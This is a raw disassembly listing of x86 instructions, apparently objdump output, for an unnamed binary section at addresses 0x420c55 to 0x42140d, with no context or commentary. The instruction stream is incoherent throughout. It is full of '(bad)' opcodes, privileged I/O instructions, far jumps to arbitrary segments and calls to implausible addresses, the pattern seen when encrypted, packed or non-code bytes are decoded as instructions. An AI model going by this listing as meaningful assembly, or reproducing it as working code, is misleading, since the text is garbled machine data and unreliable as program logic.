  420c55:	sub    BYTE PTR [ebp+0xe],0x7d
  420c59:	test   eax,0x64eae6a2
  420c5e:	aaa    
  420c5f:	xor    al,0x75
  420c61:	xchg   edi,eax
  420c62:	xor    esi,DWORD PTR ds:0x4452b1d5
  420c68:	je     0x420cd9
  420c6a:	pop    ecx
  420c6b:	or     DWORD PTR [ecx-0x574f633a],ecx
  420c71:	push   0x95c041ba
  420c76:	mov    eax,ds:0x4ad37f64
  420c7c:	adc    BYTE PTR [ebx],0x2f
  420c7f:	jecxz  0x420c60
  420c81:	jecxz  0x420c95
  420c83:	hlt    
  420c84:	and    ecx,DWORD PTR [ecx+ebx*2-0x7d8cdedc]
  420c8b:	ds and ebx,ebx
  420c8e:	inc    ebx
  420c8f:	cmc    
  420c90:	retf   
  420c91:	fsub   QWORD PTR [eax+ecx*4]
  420c94:	inc    ecx
  420c95:	sub    al,0x23
  420c97:	sbb    cl,BYTE PTR [ebx-0x1a]
  420c9a:	mov    eax,ds:0xace72647
  420c9f:	xor    BYTE PTR [ebx-0x7705bbd3],dh
  420ca5:	push   es
  420ca6:	hlt    
  420ca7:	pop    edx
  420ca8:	aad    0x63
  420caa:	ins    BYTE PTR es:[edi],dx
  420cab:	add    ah,BYTE PTR [eax+0x31014fd0]
  420cb1:	jbe    0x420c72
  420cb3:	push   ds
  420cb4:	retf   
  420cb5:	xor    dl,BYTE PTR [eax]
  420cb7:	push   0xbcdd64f6
  420cbc:	xchg   edx,ecx
  420cbe:	out    dx,al
  420cbf:	repnz xor dl,BYTE PTR [ebp+0x6766730a]
  420cc6:	jbe    0x420d2a
  420cc8:	push   es
  420cc9:	inc    esi
  420cca:	fisubr DWORD PTR [ebx-0x6b]
  420ccd:	and    eax,DWORD PTR [edx-0x51]
  420cd0:	shl    DWORD PTR [eax+0x5],1
  420cd3:	dec    esi
  420cd4:	adc    BYTE PTR [ecx+0xb56be93],0x71
  420cdb:	add    edi,DWORD PTR [eax]
  420cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cde:	into   
  420cdf:	inc    DWORD PTR [esp+esi*8-0x59bb8913]
  420ce6:	mov    DWORD PTR [ecx-0x1f],esp
  420ce9:	leave  
  420cea:	pop    esi
  420ceb:	inc    ecx
  420cec:	cs inc ebp
  420cee:	dec    eax
  420cef:	fwait
  420cf0:	lahf   
  420cf1:	fdivr  QWORD PTR [ecx+0x77]
  420cf4:	fadd   QWORD PTR [edx+0x0]
  420cf7:	cmp    DWORD PTR [esi-0x74],ecx
  420cfa:	rol    DWORD PTR [ebp+0x1eb9bf83],1
  420d00:	cld    
  420d01:	dec    esi
  420d02:	sub    al,0xe9
  420d04:	ss inc edx
  420d06:	push   edi
  420d07:	mov    dl,0x48
  420d09:	jmp    0x856d:0x3b5d92bb
  420d10:	add    eax,0xfb5ed238
  420d15:	ret    0x934e
  420d18:	xor    dl,BYTE PTR [edi+0x64]
  420d1b:	dec    ebp
  420d1c:	push   ecx
  420d1d:	call   0xa16dc11b
  420d22:	jnp    0x420d85
  420d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d25:	add    al,0x67
  420d27:	dec    ecx
  420d28:	scas   eax,DWORD PTR es:[edi]
  420d29:	aaa    
  420d2a:	inc    ecx
  420d2b:	push   cs
  420d2c:	and    al,0x54
  420d2e:	cld    
  420d2f:	call   0xf1a9:0xc98bb30e
  420d36:	cmp    ecx,DWORD PTR [edi-0x66]
  420d39:	arpl   WORD PTR [eax-0x717dd6a],bx
  420d3f:	sbb    DWORD PTR [esi+esi*8],edx
  420d42:	inc    ebp
  420d43:	add    cl,BYTE PTR [eax+0x68]
  420d46:	jmp    FWORD PTR [eax+ebp*4-0x45c40bc3]
  420d4d:	dec    ecx
  420d4e:	mov    eax,0x7ac2b5e4
  420d53:	mov    edi,0x71dd8760
  420d58:	sti    
  420d59:	jb     0x420d1c
  420d5b:	adc    BYTE PTR [edi],dl
  420d5d:	gs ss pop eax
  420d60:	les    esi,FWORD PTR [edi]
  420d62:	imul   esi,DWORD PTR [esi],0x16
  420d65:	xchg   edi,eax
  420d66:	push   ecx
  420d67:	mov    esi,0x18d6b6e0
  420d6c:	adc    al,BYTE PTR [esi+0x43d36a8f]
  420d72:	in     eax,dx
  420d73:	jns    0x420d36
  420d75:	mov    edi,0xddb97b62
  420d7a:	and    al,0xbd
  420d7c:	mov    dl,0x74
  420d7e:	(bad)
  420d81:	xor    BYTE PTR [ebx-0x3],0x2f
  420d85:	repz push ds
  420d87:	mov    WORD PTR [edi-0x7768372f],fs
  420d8d:	mov    ch,0x5a
  420d8f:	into   
  420d90:	jp     0x420d74
  420d92:	push   0xfffffff0
  420d94:	dec    edi
  420d95:	pop    esp
  420d96:	inc    esp
  420d97:	fiadd  DWORD PTR [eax+ebp*1+0x8]
  420d9b:	mov    WORD PTR [eax+eiz*2+0x3c],ss
  420d9f:	jnp    0x420da8
  420da1:	(bad)  
  420da2:	shr    DWORD PTR [esi+0x91922ae],1
  420da8:	fadd   DWORD PTR ds:0x57e12c05
  420dae:	mov    ecx,0x383ab1e6
  420db3:	cwde   
  420db4:	jmp    DWORD PTR [esi+0x59]
  420db7:	inc    edi
  420db8:	jecxz  0x420d8b
  420dba:	push   ds
  420dbb:	xor    DWORD PTR [ebp-0x65],esi
  420dbe:	mov    edi,0x8df33bd3
  420dc3:	loop   0x420db1
  420dc5:	popa   
  420dc6:	ret    
  420dc7:	mov    cl,BYTE PTR [ebp+esi*4-0x6e]
  420dcb:	add    al,0xdc
  420dcd:	cld    
  420dce:	mov    edi,DWORD PTR [ebp+0x15]
  420dd1:	jmp    0xc2c6f94
  420dd6:	out    dx,eax
  420dd7:	(bad)
  420ddc:	popf   
  420ddd:	xor    al,0x7
  420ddf:	cmp    al,0xb4
  420de1:	aaa    
  420de2:	pusha  
  420de3:	push   0x2fcccab1
  420de8:	cmp    ebp,DWORD PTR [edx]
  420dea:	loopne 0x420de3
  420dec:	(bad)  
  420ded:	jnp    0x420e06
  420def:	inc    esp
  420df0:	dec    ebx
  420df1:	stc    
  420df2:	aas    
  420df3:	rcr    BYTE PTR [esi],cl
  420df5:	daa    
  420df6:	imul   esp,DWORD PTR [ecx+ebx*4],0xffffffa3
  420dfa:	sub    al,0x5c
  420dfc:	fmul   QWORD PTR [ecx+0x22e27477]
  420e02:	adc    dh,al
  420e04:	xchg   ebx,eax
  420e05:	cld    
  420e06:	cmp    bl,BYTE PTR [eax-0x9]
  420e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e0a:	fisttp DWORD PTR [ecx-0x5b]
  420e0d:	in     eax,dx
  420e0e:	sbb    eax,DWORD PTR [ebp-0x45]
  420e11:	mov    ecx,0x1616ac34
  420e16:	pop    edx
  420e17:	je     0x420dda
  420e19:	xchg   esp,eax
  420e1a:	repnz cli 
  420e1c:	jmp    0xdc37528
  420e21:	loopne 0x420e24
  420e23:	sbb    ah,ah
  420e25:	inc    edi
  420e26:	in     al,dx
  420e27:	pop    ebx
  420e28:	sbb    ebp,DWORD PTR [ebp+esi*8-0x45]
  420e2c:	jge    0x420dc8
  420e2e:	call   0xbc4505d0
  420e33:	xchg   bh,dl
  420e35:	push   0xbc3f16a9
  420e3a:	or     dl,BYTE PTR [esi-0x69]
  420e3d:	mov    ds:0x251a8bdb,al
  420e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e43:	fs inc esi
  420e45:	push   ecx
  420e46:	sub    ebx,DWORD PTR [esi]
  420e48:	push   ebx
  420e49:	cmp    BYTE PTR [edx-0x3b],al
  420e4c:	aaa    
  420e4d:	nop
  420e4e:	adc    DWORD PTR [edi+0x58],esi
  420e51:	ror    BYTE PTR [ecx-0x3a],cl
  420e54:	shr    DWORD PTR [eax],cl
  420e56:	lahf   
  420e57:	inc    esp
  420e58:	outs   dx,BYTE PTR ds:[esi]
  420e59:	cmp    DWORD PTR [ecx],edi
  420e5b:	in     al,dx
  420e5c:	jmp    0x208e:0x915587a4
  420e63:	loope  0x420e4a
  420e65:	jle    0x420eb9
  420e67:	inc    ebx
  420e68:	shr    esp,cl
  420e6a:	lea    edi,[ebp+0x61a641c8]
  420e70:	shl    dl,0xb0
  420e73:	mov    bh,0x6f
  420e75:	cmp    DWORD PTR [esi-0x1a],ebp
  420e78:	push   ecx
  420e79:	push   ds
  420e7a:	push   cs
  420e7b:	mov    esp,0x72ee1dad
  420e80:	mov    ch,0x46
  420e82:	or     ch,BYTE PTR [ebp+0x737aedd2]
  420e88:	test   BYTE PTR [edx+ebp*2-0x78d81831],0xbd
  420e90:	add    al,0x9a
  420e92:	cmp    ebp,ebx
  420e94:	xor    bh,BYTE PTR [eax+0x49196574]
  420e9a:	mov    ah,0xaa
  420e9c:	cli    
  420e9d:	ret    0x8f70
  420ea0:	xchg   BYTE PTR [ebp+0x51],dl
  420ea3:	inc    eax
  420ea4:	ins    BYTE PTR es:[edi],dx
  420ea5:	or     al,0xfb
  420ea7:	jnp    0x420e5c
  420ea9:	and    eax,0x8ca2da07
  420eae:	ror    esp,1
  420eb0:	mov    ebx,0x770d519e
  420eb5:	sti    
  420eb6:	daa    
  420eb7:	xchg   esi,eax
  420eb8:	retf   0x566b
  420ebb:	xchg   cl,bl
  420ebd:	inc    ebx
  420ebe:	push   cs
  420ebf:	add    BYTE PTR [edi+edi*4+0x62],al
  420ec3:	in     eax,0xd9
  420ec5:	xchg   ch,ah
  420ec7:	call   esp
  420ec9:	js     0x420ec7
  420ecb:	add    al,cl
  420ecd:	shl    BYTE PTR [esi-0x22879814],0x1b
  420ed4:	adc    ah,BYTE PTR [edx+0x72]
  420ed7:	xchg   esp,eax
  420ed8:	and    BYTE PTR ds:0x6160a454,ch
  420ede:	neg    DWORD PTR ds:0x389cbcef
  420ee4:	repnz fsubr st(2),st
  420ee7:	jne    0x420e6b
  420ee9:	inc    ebp
  420eea:	ret    0x1229
  420eed:	and    dl,cl
  420eef:	mov    ebp,0x52948fc5
  420ef4:	push   edi
  420ef5:	out    dx,eax
  420ef6:	pusha  
  420ef7:	inc    esp
  420ef8:	xchg   esi,eax
  420ef9:	test   al,0x31
  420efb:	mov    bl,0x9f
  420efd:	sbb    DWORD PTR [edx-0x458a8d0c],0x221b9867
  420f07:	nop
  420f08:	jae    0x420f2f
  420f0a:	mov    al,bl
  420f0c:	jecxz  0x420eef
  420f0e:	jo     0x420f7b
  420f10:	cwde   
  420f11:	or     DWORD PTR [ecx+0x59],edx
  420f14:	mov    ch,0x95
  420f16:	icebp  
  420f17:	inc    esi
  420f18:	sub    dl,BYTE PTR [ebx-0x6e04a2e3]
  420f1e:	test   DWORD PTR [eax+0x7d799d1b],eax
  420f24:	xor    bl,0x5a
  420f27:	or     ebp,DWORD PTR [edx+eax*1-0x2f]
  420f2b:	mov    ch,0x21
  420f2d:	or     al,0xa7
  420f2f:	push   ss
  420f30:	iret   
  420f31:	shr    DWORD PTR [ecx],1
  420f33:	inc    esi
  420f34:	xchg   edx,eax
  420f35:	(bad)  [edx]
  420f37:	fwait
  420f38:	sub    eax,ebp
  420f3a:	adc    eax,0xa19490e7
  420f3f:	ror    BYTE PTR [ebp+edx*2+0x8],cl
  420f43:	inc    ebx
  420f44:	neg    DWORD PTR [ebp-0x63f3169f]
  420f4a:	and    dl,BYTE PTR [ebx]
  420f4c:	data16 mov ds:0x2922b47e,al
  420f52:	imul   ebp,DWORD PTR [edx+0x5b361ea1],0x5ae31dda
  420f5c:	cmp    al,0x8
  420f5e:	inc    ebx
  420f5f:	(bad)  
  420f60:	sbb    edi,DWORD PTR [edi-0xb6ca255]
  420f66:	xchg   BYTE PTR [esi+0x2a],dh
  420f69:	fmul   DWORD PTR [ebx+0x5c6fa97b]
  420f6f:	call   esi
  420f71:	pop    ebp
  420f72:	add    ebx,DWORD PTR [ebx-0x5c4586b4]
  420f78:	test   al,0x96
  420f7a:	sbb    dl,al
  420f7c:	mov    ch,0x9b
  420f7e:	in     al,dx
  420f7f:	fstp   QWORD PTR [edi+edx*8]
  420f82:	push   esp
  420f83:	add    al,0x3f
  420f85:	sbb    edi,ebp
  420f87:	xchg   ebp,eax
  420f88:	dec    edx
  420f89:	dec    ebp
  420f8a:	xchg   ecx,eax
  420f8b:	retf   
  420f8c:	mov    WORD PTR [ebx-0x10],ss
  420f8f:	cwde   
  420f90:	es cmp edx,edx
  420f93:	sar    eax,cl
  420f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f96:	fwait
  420f97:	retf   0x3dd3
  420f9a:	int3   
  420f9b:	push   esp
  420f9c:	xor    edx,DWORD PTR [esi+0x16]
  420f9f:	frstor [esp+ecx*4]
  420fa2:	sbb    BYTE PTR [edx+0x45],0xf6
  420fa6:	int    0x23
  420fa8:	jp     0x421000
  420faa:	cwde   
  420fab:	and    al,0x28
  420fad:	push   ss
  420fae:	mov    bl,0xd3
  420fb0:	int    0x1f
  420fb2:	cwde   
  420fb3:	out    0x2c,al
  420fb5:	lods   eax,DWORD PTR ds:[esi]
  420fb6:	mov    cs,WORD PTR [edi+0x9]
  420fb9:	mov    es,WORD PTR [eax-0xa854218]
  420fbf:	adc    ch,BYTE PTR [edi]
  420fc1:	stc    
  420fc2:	cwde   
  420fc3:	test   BYTE PTR [ecx+esi*1-0x76],ah
  420fc7:	xchg   BYTE PTR [ecx+0x558b8567],dh
  420fcd:	jecxz  0x420ffd
  420fcf:	add    BYTE PTR [ebx+0x0],dl
  420fd2:	inc    esp
  420fd3:	mov    dh,ch
  420fd5:	(bad)  
  420fd6:	retf   
  420fd7:	mov    ah,0x75
  420fd9:	loop   0x420f9e
  420fdb:	rol    BYTE PTR [ebp+0x54],1
  420fde:	or     DWORD PTR [eax],ebx
  420fe0:	mov    ecx,0xa4bc3231
  420fe5:	sbb    al,0x73
  420fe7:	aad    0xb9
  420fe9:	cmp    DWORD PTR [eax+ebp*8-0x24],edx
  420fed:	cli    
  420fee:	les    esi,FWORD PTR [esp+ebp*4+0x5fd30d0d]
  420ff5:	mov    ds:0x7e711c13,eax
  420ffa:	enter  0x1cf7,0x49
  420ffe:	test   al,0x6a
  421000:	in     al,0xd5
  421002:	out    0x1a,al
  421004:	dec    edx
  421005:	gs push esi
  421007:	inc    ecx
  421008:	and    ebx,ebx
  42100a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42100b:	pop    ecx
  42100c:	shl    DWORD PTR [ecx-0x2ff4575f],cl
  421012:	pop    ebx
  421013:	loop   0x421034
  421015:	sub    eax,0xb462347e
  42101a:	or     ecx,DWORD PTR [esi+ebx*4+0x1c]
  42101e:	push   ss
  42101f:	add    BYTE PTR [eax+0x15ef4f02],bl
  421025:	adc    cl,cl
  421027:	mov    ch,0x65
  421029:	out    dx,eax
  42102a:	stc    
  42102b:	loop   0x421027
  42102d:	fisub  WORD PTR [eax]
  42102f:	out    0xed,al
  421031:	and    cl,BYTE PTR [ebx]
  421033:	adc    eax,0xd39ecf9d
  421038:	cmp    eax,0x1e117b3b
  42103d:	push   esi
  42103e:	stos   BYTE PTR es:[edi],al
  42103f:	push   ecx
  421040:	div    edx
  421042:	mov    ebp,0xe835f72d
  421047:	mov    al,ds:0x9bbfe7be
  42104c:	ss jge 0x421032
  42104f:	xchg   DWORD PTR [ecx-0x5f],edi
  421052:	add    DWORD PTR [edi-0x3e],edi
  421055:	and    dh,BYTE PTR [ebx+0x5e]
  421058:	and    DWORD PTR [ecx-0x1305f9fc],ebx
  42105e:	(bad)  
  42105f:	adc    ch,BYTE PTR [ecx+0x6c]
  421062:	aad    0x11
  421064:	cmc    
  421065:	ds (bad) 
  421067:	cld    
  421068:	(bad)  
  421069:	arpl   WORD PTR [ebx],sp
  42106b:	or     BYTE PTR [eax+0x4e],bl
  42106e:	sbb    eax,0xd8af5ce2
  421073:	or     DWORD PTR [edi],ecx
  421075:	adc    eax,0x1f25f843
  42107a:	js     0x42102b
  42107c:	mov    eax,ds:0x6139186c
  421081:	loopne 0x421074
  421083:	jnp    0x421009
  421085:	subps  xmm3,XMMWORD PTR [eax-0x4d]
  421089:	and    DWORD PTR [ecx-0x1151113a],ecx
  42108f:	xchg   BYTE PTR [edi+edi*4],ch
  421092:	mov    ebx,0x8a96b064
  421097:	inc    ebp
  421098:	and    al,0xdb
  42109a:	ss enter 0xa3b4,0xba
  42109f:	ror    BYTE PTR [eax+esi*1-0x6e41540b],1
  4210a6:	sub    al,0xa8
  4210a8:	fnstsw WORD PTR [eax]
  4210aa:	cwde   
  4210ab:	ret    0x986d
  4210ae:	or     edx,DWORD PTR [esi-0x26d06cd3]
  4210b4:	nop
  4210b5:	pop    ds
  4210b6:	sub    esi,DWORD PTR [ebp-0x60d35ec8]
  4210bc:	mov    dh,0xa7
  4210be:	int    0xd6
  4210c0:	loop   0x421087
  4210c2:	jge    0x42111c
  4210c4:	loopne 0x421065
  4210c6:	add    eax,0xaec3db57
  4210cb:	ss pop es
  4210cd:	push   edx
  4210ce:	jnp    0x421138
  4210d0:	jmp    0x781a:0xa2f8933b
  4210d7:	jge    0x421075
  4210d9:	pop    ds
  4210da:	inc    esp
  4210db:	cmp    al,0x98
  4210dd:	pop    es
  4210de:	(bad)  
  4210df:	sbb    dl,BYTE PTR ss:[ecx+0x5582b05c]
  4210e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210e7:	mov    edx,0x5d91599c
  4210ec:	push   eax
  4210ed:	sub    BYTE PTR [edi+0x52],cl
  4210f0:	xor    DWORD PTR [esi-0x5a],edx
  4210f3:	stc    
  4210f4:	sbb    DWORD PTR [esi],eax
  4210f6:	push   ebp
  4210f7:	inc    ebp
  4210f8:	test   BYTE PTR [ebp+0x30],ah
  4210fb:	sbb    DWORD PTR ds:0x59fa5a19,eax
  421101:	ret    0x6209
  421104:	outs   dx,DWORD PTR ds:[esi]
  421105:	pop    eax
  421106:	sub    al,0xf5
  421108:	ja     0x421174
  42110a:	(bad)  
  42110b:	pop    ebp
  42110c:	(bad)  
  42110d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42110e:	das    
  42110f:	lods   al,BYTE PTR ds:[esi]
  421110:	jp     0x421184
  421112:	(bad)  
  421113:	lea    ecx,[ebx-0xbbd4828]
  421119:	stos   BYTE PTR es:[edi],al
  42111a:	sub    ebp,eax
  42111c:	add    al,0x88
  42111e:	and    edi,DWORD PTR [edi+edx*8-0x58]
  421122:	(bad)  [ebp+0x5075c06f]
  421128:	jno    0x421106
  42112a:	mov    ebp,0x45895b62
  42112f:	inc    ecx
  421130:	icebp  
  421131:	(bad)  
  421132:	ds loopne 0x421164
  421135:	dec    ecx
  421136:	mov    eax,ds:0x8361b03f
  42113b:	adc    DWORD PTR [ecx-0x68],edi
  42113e:	test   al,0x68
  421140:	enter  0xaa93,0x9e
  421144:	add    DWORD PTR [ebx],esp
  421146:	add    BYTE PTR [eax+0x343c4e8f],dh
  42114c:	xchg   ecx,eax
  42114d:	stc    
  42114e:	popf   
  42114f:	inc    edi
  421150:	mov    esi,0xaced481e
  421155:	cli    
  421156:	cmp    bh,BYTE PTR [ebp+edi*8-0xcbf99c7]
  42115d:	ret    
  42115e:	rol    esp,0xf7
  421161:	jb     0x42116a
  421163:	imul   ebx,DWORD PTR [ebp+0x1b],0xfffffff5
  421167:	push   ss
  421168:	mov    eax,ds:0x7348c673
  42116d:	pop    esp
  42116e:	addr16 pop es
  421170:	add    BYTE PTR cs:[ebp+0x62ab7579],bh
  421177:	into   
  421178:	sbb    al,0xc9
  42117a:	aad    0xd2
  42117c:	jns    0x4211a3
  42117e:	mov    edx,0x3e401db8
  421183:	adc    ebp,eax
  421185:	and    BYTE PTR [esi+0x2fbcb34c],dl
  42118b:	add    BYTE PTR [ebp-0x17],bh
  42118e:	pusha  
  42118f:	mov    ch,0x22
  421191:	aam    0xd0
  421193:	mov    edi,eax
  421195:	cld    
  421196:	xor    al,0x6
  421198:	adc    DWORD PTR [ecx+0x29],esi
  42119b:	sti    
  42119c:	in     al,dx
  42119d:	adc    ecx,ebx
  42119f:	cmp    BYTE PTR [ebp+0x55],ah
  4211a2:	fcom   DWORD PTR [esi]
  4211a4:	fwait
  4211a5:	out    dx,al
  4211a6:	ror    BYTE PTR ds:0x5153c513,1
  4211ac:	mov    bl,0xab
  4211ae:	pop    esi
  4211af:	cwde   
  4211b0:	out    0x97,eax
  4211b2:	sbb    eax,0x8ffae909
  4211b7:	push   esp
  4211b8:	sub    dh,bl
  4211ba:	jmp    0x4211ec
  4211bc:	icebp  
  4211bd:	stc    
  4211be:	xor    BYTE PTR [edx+0x22],0xb2
  4211c2:	data16 arpl WORD PTR [ebp-0x53],cx
  4211c6:	jns    0x4211fa
  4211c8:	adc    ebx,DWORD PTR [eax+0x63]
  4211cb:	xchg   esi,eax
  4211cc:	call   0x59e6cfb2
  4211d1:	test   al,0x5f
  4211d3:	repz sub ecx,edx
  4211d6:	js     0x421184
  4211d8:	pop    ss
  4211d9:	idiv   DWORD PTR [ecx+0x47686887]
  4211df:	sbb    esi,esi
  4211e1:	fcom   QWORD PTR [edi]
  4211e3:	out    0xf6,al
  4211e5:	inc    esp
  4211e6:	in     eax,0x6f
  4211e8:	retw   
  4211ea:	fild   QWORD PTR [eax+0x75]
  4211ed:	xchg   esp,eax
  4211ee:	sbb    BYTE PTR ds:[ebx-0x21],al
  4211f2:	popf   
  4211f3:	shl    DWORD PTR [ebx],1
  4211f5:	xchg   edx,eax
  4211f6:	call   0x2d72b0f6
  4211fb:	or     al,0x66
  4211fd:	sahf   
  4211fe:	jmp    0x4211d7
  421200:	xor    DWORD PTR [esi],ebp
  421202:	lods   al,BYTE PTR ds:[esi]
  421203:	sbb    al,0xcf
  421205:	imul   edx,esp,0xffffff9f
  421208:	mov    edi,DWORD PTR [edx+0x1e]
  42120b:	mov    al,ds:0xddfbe482
  421210:	cmp    esp,DWORD PTR [eax+0x2c7cb64a]
  421216:	ficom  WORD PTR [ebx+0x259d38b]
  42121c:	jecxz  0x4211c1
  42121e:	mov    cl,0x1f
  421220:	int    0xa1
  421222:	and    eax,0xbe02e7f6
  421227:	(bad)  
  421228:	adc    al,0x63
  42122a:	mov    WORD PTR [ebx-0x7682488d],ss
  421230:	popa   
  421231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421232:	cli    
  421233:	aam    0x1a
  421235:	mov    eax,0x6ac86f40
  42123a:	and    eax,eax
  42123c:	and    ebx,DWORD PTR [eax+eax*8]
  42123f:	xchg   DWORD PTR [esi+0x5034460a],eax
  421245:	mov    esi,esp
  421247:	inc    ebx
  421248:	jl     0x4212a5
  42124a:	push   ebp
  42124b:	xchg   edi,eax
  42124c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42124d:	hlt    
  42124e:	addr16 pop ecx
  421250:	jns    0x421204
  421252:	push   ds
  421253:	push   edx
  421254:	retf   
  421255:	and    DWORD PTR [edx+ebp*4-0x3e],0xffffffc2
  42125a:	out    0xdd,al
  42125c:	aam    0x8
  42125e:	icebp  
  42125f:	and    al,0xad
  421261:	sub    eax,0x98582f17
  421266:	adc    BYTE PTR [ecx],0x77
  421269:	push   ebp
  42126a:	add    eax,0xa44084a3
  42126f:	pusha  
  421270:	or     ah,BYTE PTR [ecx]
  421272:	lahf   
  421273:	mov    esp,0x66dab7ee
  421278:	aad    0x8a
  42127a:	hlt    
  42127b:	and    bl,BYTE PTR ds:0x657fa60e
  421281:	inc    edx
  421282:	sub    DWORD PTR [edx-0x5e],ebp
  421285:	imul   edx,DWORD PTR [ebp+0x4ed38f40],0xffffffd8
  42128c:	sub    ah,BYTE PTR [ebp-0xd]
  42128f:	push   esp
  421290:	jnp    0x421277
  421292:	and    eax,0x3bb010e6
  421297:	xchg   edx,eax
  421298:	data16 div BYTE PTR [ebx-0x609d44e0]
  42129f:	or     edx,edx
  4212a1:	push   ss
  4212a2:	shl    BYTE PTR [eax-0x1],cl
  4212a5:	lock xchg edx,eax
  4212a7:	push   es
  4212a8:	sbb    al,0x14
  4212aa:	push   cs
  4212ab:	loop   0x4212bb
  4212ad:	push   0x4c
  4212af:	xchg   DWORD PTR [ecx+0x5d],esi
  4212b2:	ficom  DWORD PTR [ebx+0x6e]
  4212b5:	inc    esi
  4212b6:	dec    ebx
  4212b7:	push   ds
  4212b8:	sbb    eax,0x4ea23540
  4212bd:	retf   
  4212be:	aas    
  4212bf:	outs   dx,DWORD PTR ds:[esi]
  4212c0:	and    BYTE PTR fs:[eax+ebx*1-0x2f],ah
  4212c5:	fmul   DWORD PTR [ebx+edi*1+0x4faed84c]
  4212cc:	pop    esp
  4212cd:	repz mov ebp,DWORD PTR [edx+0x5d]
  4212d1:	ret    
  4212d2:	popf   
  4212d3:	ds in  al,0x1c
  4212d6:	sbb    BYTE PTR [edi+0x51],0xb4
  4212da:	mov    bl,0x6c
  4212dc:	mov    DWORD PTR [ecx],ebp
  4212de:	jo     0x4212f3
  4212e0:	cmp    al,0xe3
  4212e2:	shl    DWORD PTR [edi+0x4e5cc043],1
  4212e8:	mov    ebp,DWORD PTR [edi+0x34]
  4212eb:	int    0xd5
  4212ed:	sbb    edx,DWORD PTR [ebx+0x1]
  4212f0:	shl    DWORD PTR [edi-0x6d8c5fb],0x49
  4212f7:	daa    
  4212f8:	ret    
  4212f9:	(bad)  
  4212fa:	jecxz  0x421343
  4212fc:	inc    edi
  4212fd:	and    al,0xc0
  4212ff:	iret   
  421300:	push   ss
  421301:	loop   0x421374
  421303:	push   ecx
  421304:	jle    0x42137e
  421306:	xchg   ebx,eax
  421307:	or     al,0xe3
  421309:	ins    BYTE PTR es:[edi],dx
  42130a:	hlt    
  42130b:	or     dh,bl
  42130d:	(bad)  
  42130e:	aad    0xa7
  421310:	fidiv  WORD PTR [ecx-0x53]
  421313:	sbb    DWORD PTR [ecx-0x40],eax
  421316:	ds cmp ecx,0xfffffff6
  42131a:	jne    0x421312
  42131c:	add    DWORD PTR [edx+0x3c],0xffffffa3
  421320:	add    DWORD PTR [ecx-0x3d],edi
  421323:	push   edx
  421324:	loope  0x4212e9
  421326:	lods   eax,DWORD PTR ds:[esi]
  421327:	(bad)  
  421328:	test   eax,0xb9f301a6
  42132d:	xchg   ebp,eax
  42132e:	or     ebx,DWORD PTR [eax]
  421330:	jmp    0x9fb9:0xae7b4c51
  421337:	mov    ch,0xfc
  421339:	(bad)  
  42133a:	jns    0x421313
  42133c:	mov    eax,ds:0x61cac838
  421341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421342:	out    0x1b,al
  421344:	out    dx,al
  421345:	retf   0x788b
  421348:	jge    0x4213b9
  42134a:	stos   DWORD PTR es:[edi],eax
  42134b:	mov    al,ds:0x91469052
  421350:	push   ebx
  421351:	xor    ecx,DWORD PTR [esi]
  421353:	stos   BYTE PTR es:[edi],al
  421354:	push   cs
  421355:	push   edi
  421356:	cmp    al,0xce
  421358:	jge    0x421376
  42135a:	gs pop edi
  42135c:	jnp    0x421366
  42135e:	xchg   esi,eax
  42135f:	mov    dh,0xc8
  421361:	push   ebp
  421362:	scas   eax,DWORD PTR es:[edi]
  421363:	lds    edi,FWORD PTR [ebx-0x7f]
  421366:	test   ecx,eax
  421368:	mov    WORD PTR [esi+ecx*8-0x5d94b442],?
  42136f:	sbb    DWORD PTR [edi-0x161e7e66],0x54
  421376:	adc    dh,BYTE PTR [ecx+eax*2-0x18c42283]
  42137d:	dec    edx
  42137e:	mov    ebx,0x6433f622
  421383:	mov    edx,0x2e1d8985
  421388:	push   cs
  421389:	scas   eax,DWORD PTR es:[edi]
  42138a:	xor    BYTE PTR [edi],ah
  42138c:	jl     0x42137f
  42138e:	lock inc edx
  421390:	into   
  421391:	idiv   DWORD PTR [ebx+0x34]
  421394:	cmp    BYTE PTR [ebx+ebx*4+0x42],dh
  421398:	lods   al,BYTE PTR ds:[esi]
  421399:	aas    
  42139a:	imul   ebx,DWORD PTR [ecx+ebp*4],0xffffff96
  42139e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42139f:	into   
  4213a0:	mov    esp,0x790c813b
  4213a5:	pop    eax
  4213a6:	lahf   
  4213a7:	aas    
  4213a8:	pop    ss
  4213a9:	imul   esp,DWORD PTR ds:0x84cf229b,0xffffffd5
  4213b0:	jbe    0x421333
  4213b2:	in     eax,dx
  4213b3:	add    DWORD PTR [ebx],0xffffffd6
  4213b6:	push   edi
  4213b7:	sbb    eax,0x19d72d84
  4213bc:	mov    WORD PTR [edx-0x3c4233c5],?
  4213c2:	mov    eax,0x47e9f05d
  4213c7:	inc    ecx
  4213c8:	jbe    0x421399
  4213ca:	inc    ebx
  4213cb:	dec    ecx
  4213cc:	inc    esi
  4213cd:	add    BYTE PTR [edi],0xb7
  4213d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213d1:	aam    0xaf
  4213d3:	(bad)  
  4213d4:	neg    DWORD PTR [ebx+edi*1-0x6d4bee38]
  4213db:	and    ecx,DWORD PTR [edi+0x39f44bb8]
  4213e1:	jmp    0x7e2dc93d
  4213e6:	push   ss
  4213e7:	imul   edx,DWORD PTR [edi],0x65
  4213ea:	mov    edi,0xab42a6ec
  4213ef:	into   
  4213f0:	dec    esi
  4213f1:	mov    eax,ds:0x924719c5
  4213f6:	rcr    BYTE PTR [edx],1
  4213f8:	enter  0x671a,0x9
  4213fc:	pop    esp
  4213fd:	lahf   
  4213fe:	out    0xe0,al
  421400:	add    DWORD PTR [ecx-0x29],eax
  421403:	pop    eax
  421404:	aas    
  421405:	les    esp,FWORD PTR [ecx+0x3bf80163]
  42140b:	ins    BYTE PTR es:[edi],dx
  42140c:	icebp  
  42140d:	jae    0x4213da
